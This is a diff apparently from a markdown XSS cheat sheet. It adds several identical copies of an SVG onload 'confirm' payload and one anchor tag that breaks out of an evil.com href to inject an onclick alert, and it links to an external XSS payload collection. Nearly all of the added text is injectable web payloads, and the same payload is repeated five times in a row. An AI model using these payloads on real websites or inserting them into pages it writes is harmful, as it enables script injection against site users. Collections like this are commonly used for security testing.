@@ -7,6 +7,30 @@
 ```
 <!--><Svg OnLoad=(confirm)(1)-->
 ```
+###
+```
+<!--><Svg OnLoad=(confirm)(1)-->
+```
+###
+```
+<!--><Svg OnLoad=(confirm)(1)-->
+```
+###
+```
+<!--><Svg OnLoad=(confirm)(1)-->
+```
+###
+```
+<!--><Svg OnLoad=(confirm)(1)-->
+```
+###
+```
+<a href="https://evil.com/ \"onclick="alert(1)">
+```
+###
+```
+<!--><Svg OnLoad=(confirm)(1)-->
+```
 XSS BIBLE---> https://github.com/s0md3v/AwesomeXSS
 ###
 ```
